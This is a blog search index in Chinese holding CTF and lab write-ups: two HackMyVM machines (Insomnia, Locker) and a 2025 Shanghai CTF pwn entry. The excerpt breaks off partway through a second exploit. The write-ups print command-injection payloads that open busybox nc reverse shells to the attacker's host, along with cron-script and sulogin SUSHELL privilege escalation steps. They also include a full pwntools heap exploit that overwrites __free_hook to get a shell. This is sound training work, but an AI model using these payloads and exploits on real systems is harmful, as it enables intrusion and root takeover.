<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>hackmyvm-Insomnia</title>
      <link href="/2025/09/09/hackmyvm-Insomnia/"/>
      <url>/2025/09/09/hackmyvm-Insomnia/</url>
      
        <content type="html"><![CDATA[<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 192.168.56.116</span><br><span class="line">8080/tcp open  http    PHP cli server 5.5 or later (PHP 7.3.19-1)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/LonTan0/picgo/main/202509091653559.png"><br>测试了一下输入，没发现什么东西，然后用gobuster扫目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u http://192.168.56.116:8080/ -w /usr/share/wordlists/dirb/common.txt -x php,txt -t 50</span><br><span class="line"></span><br><span class="line">Error: the server returns a status code that matches the provided options <span class="keyword">for</span> non existing urls. http://192.168.56.116:8080/80cbd6f3-50bf-449f-8dd0-1ed2ffa6b4f8 =&gt; 200 (Length: 2899). To <span class="built_in">continue</span> please exclude the status code or the length</span><br></pre></td></tr></table></figure><p>第一次扫报了一个错，搜索得知：<br>Gobuster 默认逻辑是：如果请求一个随机路径（比如它自动生成的 <code>80cbd6f3-50bf-449f-8dd0-1ed2ffa6b4f8</code>）返回的状态码不是 404，它就会认为服务器可能配置了自定义的 404 页面，导致“假阳性”结果。<br>现在返回的是 <strong>200</strong> 且页面长度固定为 <strong>2899</strong>，说明目标服务器对不存在的路径统一返回一个自定义页面（比如“找不到页面”但状态码没改对）。<br>修改为过滤掉这个长度。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u http://192.168.56.116:8080/ \</span><br><span class="line">-w /usr/share/wordlists/dirb/common.txt \</span><br><span class="line">-x php,txt \</span><br><span class="line">-t 50 \</span><br><span class="line">--exclude-length 2899</span><br></pre></td></tr></table></figure><p>之后得到三个路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/administration.php   (Status: 200) [Size: 65]</span><br><span class="line">/chat.txt             (Status: 200) [Size: 1]</span><br><span class="line">/process.php          (Status: 200) [Size: 2]</span><br></pre></td></tr></table></figure><p>依次访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/administration.php</span><br><span class="line">You are not allowed to view : </span><br><span class="line">Your activity has been logged</span><br><span class="line">/chat.txt</span><br><span class="line">得到的是初始发送的数据回显</span><br><span class="line">/process.php </span><br><span class="line">[]</span><br></pre></td></tr></table></figure><h2 id="fuzz参数"><a href="#fuzz参数" class="headerlink" title="fuzz参数"></a>fuzz参数</h2><p>然后fuzz &#x2F;administration.php的参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt --hh 65 &#x27;http://192.168.56.116:8080/administration.php?FUZZ=test&#x27;</span><br><span class="line"> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.</span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http://192.168.56.116:8080/administration.php?FUZZ=test</span><br><span class="line">Total requests: 951</span><br><span class="line"></span><br><span class="line">=====================================================================</span><br><span class="line">ID           Response   Lines    Word       Chars       Payload                                                                          </span><br><span class="line">=====================================================================</span><br><span class="line"></span><br><span class="line">000000485:   200        2 L      12 W       69 Ch       &quot;logfile&quot;                                                                        </span><br><span class="line"></span><br><span class="line">Total time: 0</span><br><span class="line">Processed Requests: 951</span><br><span class="line">Filtered Requests: 950</span><br><span class="line">Requests/sec.: 0</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到logfile</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/administration.php?logfile=a</span><br><span class="line">You are not allowed to view : a</span><br><span class="line">Your activity has been logged</span><br></pre></td></tr></table></figure><p>发现存在命令注入，反弹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/administration.php?logfile=id;busybox nc 192.168.56.102 6666 -e sh</span><br></pre></td></tr></table></figure><h2 id="user"><a href="#user" class="headerlink" title="user"></a>user</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)</span><br><span class="line"><span class="built_in">sudo</span> -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> www-data on insomnia:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User www-data may run the following commands on insomnia:</span><br><span class="line">    (julia) NOPASSWD: /bin/bash /var/www/html/start.sh</span><br></pre></td></tr></table></figure><p>改start.sh可以反弹出来julia的shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;busybox nc 192.168.56.102 6666 -e sh&#x27;</span> &gt;&gt; /var/www/html/start.sh</span><br><span class="line"><span class="built_in">sudo</span> -u julia /bin/bash /var/www/html/start.sh</span><br></pre></td></tr></table></figure><h2 id="root"><a href="#root" class="headerlink" title="root"></a>root</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> f -writable 2&gt;/dev/null</span><br><span class="line">/var/cron/check.sh</span><br><span class="line">julia@insomnia:/var/cron$ <span class="built_in">ls</span> -la</span><br><span class="line"><span class="built_in">ls</span> -la</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x  2 root root 4096 Dec 21  2020 .</span><br><span class="line">drwxr-xr-x 13 root root 4096 Dec 21  2020 ..</span><br><span class="line">-rwxrwxrwx  1 root root  153 Dec 21  2020 check.sh</span><br><span class="line">julia@insomnia:/var/cron$ <span class="built_in">cat</span> check.sh</span><br><span class="line"><span class="built_in">cat</span> check.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">status=$(systemctl is-active insomnia.service)</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$status</span>&quot;</span> == <span class="string">&quot;active&quot;</span>  ]; <span class="keyword">then</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;OK&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">   systemctl start  insomnia.service</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">julia@insomnia:/var/cron$ <span class="built_in">cat</span> /etc/cron*</span><br><span class="line"><span class="built_in">cat</span> /etc/cron*</span><br><span class="line"><span class="built_in">cat</span>: /etc/cron.d: Is a directory</span><br><span class="line"><span class="built_in">cat</span>: /etc/cron.daily: Is a directory</span><br><span class="line"><span class="built_in">cat</span>: /etc/cron.hourly: Is a directory</span><br><span class="line"><span class="built_in">cat</span>: /etc/cron.monthly: Is a directory</span><br><span class="line"><span class="comment"># /etc/crontab: system-wide crontab</span></span><br><span class="line"><span class="comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span></span><br><span class="line"><span class="comment"># command to install the new version when you edit this file</span></span><br><span class="line"><span class="comment"># and files in /etc/cron.d. These files also have username fields,</span></span><br><span class="line"><span class="comment"># that none of the other crontabs do.</span></span><br><span class="line"></span><br><span class="line">SHELL=/bin/sh</span><br><span class="line">PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line"></span><br><span class="line"><span class="comment"># Example of job definition:</span></span><br><span class="line"><span class="comment"># .---------------- minute (0 - 59)</span></span><br><span class="line"><span class="comment"># |  .------------- hour (0 - 23)</span></span><br><span class="line"><span class="comment"># |  |  .---------- day of month (1 - 31)</span></span><br><span class="line"><span class="comment"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span></span><br><span class="line"><span class="comment"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span></span><br><span class="line"><span class="comment"># |  |  |  |  |</span></span><br><span class="line"><span class="comment"># *  *  *  *  * user-name command to be executed</span></span><br><span class="line">17 *    * * *   root    <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly</span><br><span class="line">25 6    * * *   root    <span class="built_in">test</span> -x /usr/sbin/anacron || ( <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.daily )</span><br><span class="line">47 6    * * 7   root    <span class="built_in">test</span> -x /usr/sbin/anacron || ( <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.weekly )</span><br><span class="line">52 6    1 * *   root    <span class="built_in">test</span> -x /usr/sbin/anacron || ( <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.monthly )</span><br><span class="line">*  *    * * *   root    /bin/bash /var/cron/check.sh</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="built_in">cat</span>: /etc/cron.weekly: Is a directory</span><br></pre></td></tr></table></figure><p>存在定时任务每分钟以root用户执行这个脚本，并且这个脚本有rwx权限。<br>修改一下，就能通过定时任务拿到rootshell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;#!/bin/bash</span></span><br><span class="line"><span class="string">chmod +s /bin/bash&#x27;</span> &gt; /var/cron/check.sh</span><br><span class="line">julia@insomnia:/var/cron$ <span class="built_in">ls</span> -la /bin/bash</span><br><span class="line"><span class="built_in">ls</span> -la /bin/bash</span><br><span class="line">-rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash</span><br><span class="line">julia@insomnia:/var/cron$ bash -p</span><br><span class="line">bash -p</span><br><span class="line">bash-5.0# <span class="built_in">id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=1000(julia) gid=1000(julia) euid=0(root) egid=0(root) <span class="built_in">groups</span>=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),1000(julia)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
            <tag> hackmyvm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackmyvm-locker</title>
      <link href="/2025/09/08/hackmyvm-locker/"/>
      <url>/2025/09/08/hackmyvm-locker/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[192.168.56.115/locker.php?image=1](http://192.168.56.115/locker.php?image=1)</span><br></pre></td></tr></table></figure><p>这个点进去访问是一张图片<br>然后gobuster加上jpg后缀扫一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gobuster dir -u http://192.168.56.115/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,jpg -t 50                    </span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.6</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.56.115/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 50</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirb/common.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.6</span><br><span class="line">[+] Extensions:              jpg,php,txt</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/1.jpg                (Status: 200) [Size: 45726]</span><br><span class="line">/2.jpg                (Status: 200) [Size: 66605]</span><br><span class="line">/3.jpg                (Status: 200) [Size: 62722]</span><br><span class="line">/index.html           (Status: 200) [Size: 142]</span><br><span class="line">Progress: 18456 / 18460 (99.98%)</span><br><span class="line">===============================================================</span><br><span class="line">Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure><p>但是访问1.jpg是404的，访问2,3就是其他图片。猜测后缀是自动添加的。访问1.jpg就变成了1.jpg.jpg。<br>这里通过wp学到可以用分号闭合。<br><img src="https://raw.githubusercontent.com/LonTan0/picgo/main/202509082047440.png"><br>然后可以读一下locker.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.14.2</span><br><span class="line">Date: Mon, 08 Sep 2025 12:05:06 GMT</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 244</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;data:image/jpg;base64,&lt;?php</span><br><span class="line">$image = $_GET[&#x27;image&#x27;];</span><br><span class="line">$command = &quot;cat &quot;.$image.&quot;.jpg | base64&quot;;</span><br><span class="line">$output = shell_exec($command);</span><br><span class="line">print&#x27;&lt;img src=&quot;data:image/jpg;base64,&#x27;.$output.&#x27;&quot;width=&quot;150&quot;height=&quot;150&quot;/&gt;&#x27;;</span><br><span class="line">?&gt;</span><br><span class="line">&quot;width=&quot;150&quot;height=&quot;150&quot;/&gt;</span><br></pre></td></tr></table></figure><p>然后测试命令执行。<br><img src="https://raw.githubusercontent.com/LonTan0/picgo/main/202509082028113.png"><br>先输入;闭合cat再拼接命令<br>然后反弹shell<br><img src="https://raw.githubusercontent.com/LonTan0/picgo/main/202509081953400.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">www-data@locker:/home$ find / -perm -4000 -type f 2&gt;/dev/null</span><br><span class="line">find / -perm -4000 -type f 2&gt;/dev/null</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/sbin/sulogin</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/su</span><br></pre></td></tr></table></figure><p>有一个sulogin<br>相当于可以启动一个维护系统的shell，而sulogin启动时会检测环境变量SUSHELL<br>这个可以控制启动shell的路径，但是可以改为一个脚本，这样就是用root去运行一个脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">os.setuid(<span class="number">0</span>)</span><br><span class="line">os.setgid(<span class="number">0</span>)</span><br><span class="line">os.system(<span class="string">&#x27;/bin/bash&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>之后利用python开一个端口，利用wget传进&#x2F;tmp目录并加执行权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">www-data@locker:/tmp$ SUSHELL=/tmp/exp.py sulogin -e</span><br><span class="line">SUSHELL=/tmp/exp.py sulogin -e</span><br><span class="line">Press Enter for maintenance</span><br><span class="line">(or press Control-D to continue): </span><br><span class="line"></span><br><span class="line">root@locker:~# id</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),33(www-data)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
            <tag> hackmyvm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2025上海磐石wp-pwn</title>
      <link href="/2025/08/08/2025%E4%B8%8A%E6%B5%B7%E7%A3%90%E7%9F%B3wp-pwn/"/>
      <url>/2025/08/08/2025%E4%B8%8A%E6%B5%B7%E7%A3%90%E7%9F%B3wp-pwn/</url>
      
        <content type="html"><![CDATA[<h2 id="user"><a href="#user" class="headerlink" title="user"></a>user</h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/45119733/1754480014300-3d7c5739-872d-44ce-8d37-215c19f04f37.png"></p><p>2.31的堆题，没有show功能，但是测试后发现edit可以输入负数，能够向上越界写，考虑通过攻击stdout泄露libc地址。</p><p>调试中发现控制heap数组下标为-8时，即可修改 <code>_IO_2_1_stdout_</code> 内容。泄露libc地址。</p><p>之后在8008地址处存在a-&gt;a，这样的结构，即heap[-11]时，edit(-11)修改8008指向的地址也就是修改8008为free_hook，之后再edit(-11)即修改free_hook为system，最后free掉一个fd位写入binsh字符串的堆块即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> p.send(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> p.sendline(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">delim, data</span>):</span><br><span class="line">    <span class="keyword">return</span> p.sendlineafter(delim, data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>():</span><br><span class="line">    <span class="keyword">return</span> p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_libc64</span>():</span><br><span class="line">    <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_libc32</span>():</span><br><span class="line">     <span class="keyword">return</span> u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line">    <span class="keyword">return</span> (libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>)))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">li</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./user&#x27;</span>)</span><br><span class="line">file_name = <span class="string">&#x27;./user&#x27;</span></span><br><span class="line"></span><br><span class="line">debug_mode = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug_mode:</span><br><span class="line">    p = remote(<span class="string">&#x27;pss.idss-cn.com&#x27;</span>,<span class="number">23713</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">c</span>):</span><br><span class="line">    rl(<span class="string">b&#x27;Exit&#x27;</span>)</span><br><span class="line">    s(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    rl(<span class="string">b&#x27;username:&#x27;</span>)</span><br><span class="line">    s(c)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    rl(<span class="string">b&#x27;Exit&#x27;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    rl(<span class="string">b&#x27;index:&#x27;</span>)</span><br><span class="line">    sl(idx)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,c</span>):</span><br><span class="line">    rl(<span class="string">b&#x27;Exit&#x27;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    rl(<span class="string">b&#x27;index:&#x27;</span>)</span><br><span class="line">    sl(idx)</span><br><span class="line">    rl(<span class="string">b&#x27;username:&#x27;</span>)</span><br><span class="line">    s(c)</span><br><span class="line"></span><br><span class="line">add(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="string">b&#x27;-8&#x27;</span>,p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0x0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">libc_base=get_libc64()-<span class="number">0x1ca980</span><span class="comment"># - 0x193fd9</span></span><br><span class="line">li(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]-<span class="number">0x22000</span></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>] -<span class="number">0x22000</span></span><br><span class="line">li(<span class="built_in">hex</span>(free_hook))</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">edit(<span class="string">b&#x27;-11&#x27;</span>,p64(free_hook))</span><br><span class="line">edit(<span class="string">b&#x27;-11&#x27;</span>,p64(system))</span><br><span class="line"></span><br><span class="line">free(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/45119733/1754480414212-4eab52d6-c09e-4b86-a6b0-d685cb3d8f1e.png"></p><h2 id="account"><a href="#account" class="headerlink" title="account"></a>account</h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/45119733/1754477417791-4bc38564-6a40-4fba-8a77-54902106a72d.png"></p><p>只有这一个函数，嵌套在while循环中的读入数字在v1变量，以及通过++v2来改变赋值在栈上的位置，达成不断往栈上读入的效果，只是读入的类型是32位int，即4字节有符号整数。</p><p>没有限制读入次数，所以有栈溢出，通过调试获得读入到返回地址所需要的数据，<br>以及需要注意覆盖好v2的值，让他继续往下读入，之后控制到返回地址，然后打ret2libc。</p><p>这里要注意32位程序中的地址是4字节无符号整数，而scanf读入的是int类型，如果rop链中地址大，可能会溢出，所以要转成原数的补码发送，即addr-0x100000000。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 